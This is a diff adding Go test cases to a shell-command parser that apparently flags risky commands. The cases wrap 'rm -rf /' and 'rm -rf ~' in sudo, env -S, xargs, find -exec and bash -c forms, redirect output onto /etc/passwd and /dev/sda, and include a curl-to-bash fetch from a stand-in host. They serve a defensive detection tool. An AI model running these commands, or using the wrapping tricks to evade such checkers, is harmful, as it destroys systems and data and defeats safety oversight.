@@ -5,6 +5,7 @@ import (
 	"slices"
 	"strings"
 	"testing"
+	"time"
 )
 
 // names lists every command found, pipeline by pipeline, as "a|b" strings.
@@ -84,6 +85,30 @@ func TestWrappersAreStripped(t *testing.T) {
 		{"command rm x", "rm", false, false, []string{"x"}},
 		{"xargs -n 1 rm -f", "rm", false, true, []string{"-f"}},
 		{"sudo env A=1 xargs rm", "rm", true, true, nil},
+		{"exec -a ls rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"sudo -iu root rm -rf /", "rm", true, false, []string{"-rf", "/"}},
+		{"sudo -uroot rm -rf /", "rm", true, false, []string{"-rf", "/"}},
+		{"sudo --user root rm -rf /", "rm", true, false, []string{"-rf", "/"}},
+		{"sudo -T 5 -R /srv -c cls -a bsd rm -rf /", "rm", true, false, []string{"-rf", "/"}},
+		{"sudo --chroot /srv --command-timeout 5 --login-class c rm -rf /", "rm", true, false, []string{"-rf", "/"}},
+		{"timeout --signal KILL 5 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"stdbuf -o 0 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"nice --adjustment 5 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"ionice --class 2 --classdata 4 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"xargs --max-args 1 rm -rf", "rm", false, true, []string{"-rf"}},
+		{"xargs -n1 rm -rf", "rm", false, true, []string{"-rf"}},
+		{"xargs -ri rm -rf {}", "rm", false, true, []string{"-rf", "{}"}},
+		{"xargs -i rm -rf {}", "rm", false, true, []string{"-rf", "{}"}},
+		{"xargs -l rm -rf", "rm", false, true, []string{"-rf"}},
+		{"env -S 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
+		{"env -S'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
+		{"env -iS 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
+		{"env -vS 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
+		{`env -S 'rm\_-rf\_/'`, "rm", false, false, []string{"-rf", "/"}},
+		{"env --split-string='rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
+		{"env --split-string 'FOO=1 sudo rm -rf /'", "rm", true, false, []string{"-rf", "/"}},
+		{"env -iu HOME rm -rf /", "rm", false, false, []string{"-rf", "/"}},
+		{"env --unset HOME rm -rf /", "rm", false, false, []string{"-rf", "/"}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.line, func(t *testing.T) {
@@ -114,6 +139,47 @@ func TestNestedContext(t *testing.T) {
 	if c := find(mustParse(t, "bash <(curl -s http://x.example/install)"), "bash"); c == nil || !c.Downloads {
 		t.Errorf("process substitution that downloads should set Downloads, got %+v", c)
 	}
+	for _, line := range []string{
+		"bash -lc 'rm -rf ~'", "bash -xc 'rm -rf ~'", "sh -ec 'rm -rf ~'", "bash -c -- 'rm -rf ~'",
+		"bash -c -e 'rm -rf ~'", "bash -c -x 'rm -rf ~'", "bash -Oc extglob 'rm -rf ~'",
+		"bash -co posix 'rm -rf ~'", "bash -oc posix 'rm -rf ~'", "bash --norc -c 'rm -rf ~'",
+		`find . -exec sh -c 'rm -rf /' \;`, "find . -exec bash -c 'rm -rf ~' {} +",
+	} {
+		if find(mustParse(t, line), "rm") == nil {
+			t.Errorf("%q: the code after -c was not analysed", line)
+		}
+	}
+	for _, line := range []string{"bash -c", "bash -c --", "bash -x 'rm -rf ~'", "bash -o posix", "bash -"} {
+		if got := names(mustParse(t, line)); len(got) != 1 {
+			t.Errorf("%q: found commands %v, want only the shell", line, got)
+		}
+	}
+}
+
+// Each -exec belongs to the find that is its inner command, so nesting must
+// cost one pass per level, not a rescan of every inner word.
+func nestedFind(n int) string {
+	return "find . " + strings.Repeat("-exec find . ", n) + "-exec rm -rf / " + strings.Repeat(`\; `, n+1)
+}
+
+func TestNestedFindExecIsLinear(t *testing.T) {
+	start := time.Now()
+	r := mustParse(t, nestedFind(40))
+	if d := time.Since(start); d > time.Second {
+		t.Errorf("40 nested -exec took %v", d)
+	}
+	if len(r.Pipelines) == 0 {
+		t.Error("nothing was found")
+	}
+}
+
+func BenchmarkNestedFindExec(b *testing.B) {
+	line := nestedFind(40)
+	for b.Loop() {
+		if _, err := Parse(line); err != nil {
+			b.Fatal(err)
+		}
+	}
 }
 
 func TestRedirects(t *testing.T) {
@@ -126,6 +192,21 @@ func TestRedirects(t *testing.T) {
 	r := mustParse(t, "> important.db")
 	if len(r.Pipelines) != 1 || r.Pipelines[0].Cmds[0].Name != "" || len(r.Pipelines[0].Cmds[0].Redirs) != 1 {
 		t.Errorf("bare redirect not captured: %+v", r.Pipelines)
+	}
+	// So is one left over after exec or command strips off.
+	for _, line := range []string{"exec > /etc/passwd", "exec 3> /dev/sda", "command > /dev/sda", "ls | exec > /etc/passwd"} {
+		found := false
+		for _, p := range mustParse(t, line).Pipelines {
+			for _, c := range p.Cmds {
+				found = found || (c.Name == "" && len(c.Redirs) == 1)
+			}
+		}
+		if !found {
+			t.Errorf("%q: the redirect was dropped", line)
+		}
+	}
+	if got := names(mustParse(t, "exec")); len(got) != 0 {
+		t.Errorf("a bare exec has nothing to rate, got %v", got)
 	}
 }
 
@@ -205,7 +286,8 @@ func TestStdinFromPipeHereStringAndHeredoc(t *testing.T) {
 }
 
 func TestShellReadingStdinIsParsed(t *testing.T) {
-	for _, line := range []string{`echo "rm -rf /" | sh`, `echo "rm -rf /" | sudo bash`, "bash <<EOF\nrm -rf /\nEOF"} {
+	for _, line := range []string{`echo "rm -rf /" | sh`, `echo "rm -rf /" | sudo bash`, "bash <<EOF\nrm -rf /\nEOF",
+		`echo 'rm -rf ~' | bash -s -- -lc`, `echo 'rm -rf ~' | bash -s -- -c`} {
 		if find(mustParse(t, line), "rm") == nil {
 			t.Errorf("%q: code fed to a shell on stdin was not analysed", line)
 		}
@@ -213,6 +295,11 @@ func TestShellReadingStdinIsParsed(t *testing.T) {
 	// A shell running a named script is not reading stdin.
 	if find(mustParse(t, `echo "rm -rf /" | bash script.sh`), "rm") != nil {
 		t.Error("bash script.sh must not execute the echoed text")
+	}
+	for _, line := range []string{`echo "rm -rf /" | bash -xc`, `echo "rm -rf /" | bash -lc 'ls'`} {
+		if find(mustParse(t, line), "rm") != nil {
+			t.Errorf("%q: text that is not run as code was analysed", line)
+		}
 	}
 }
 
@@ -337,5 +424,25 @@ func TestFetchedArgs(t *testing.T) {
 		if !slices.Equal(got, tc.want) {
 			t.Errorf("%s: FetchedArgs = %v, want %v", tc.line, got, tc.want)
 		}
+	}
+}
+
+func TestEnvSplitOddInput(t *testing.T) {
+	tests := []struct {
+		line string
+		want []string
+	}{
+		{"env -S", nil},
+		{"env -S ''", []string{"env"}},
+		{"env -S '('", []string{"env"}},
+		{"env -S 'ls | rm -rf /'", []string{"env"}},
+		{"env -S 'ls -l'", []string{"ls"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.line, func(t *testing.T) {
+			if got := names(mustParse(t, tt.line)); !reflect.DeepEqual(got, tt.want) {
+				t.Errorf("names = %v, want %v", got, tt.want)
+			}
+		})
 	}
 }
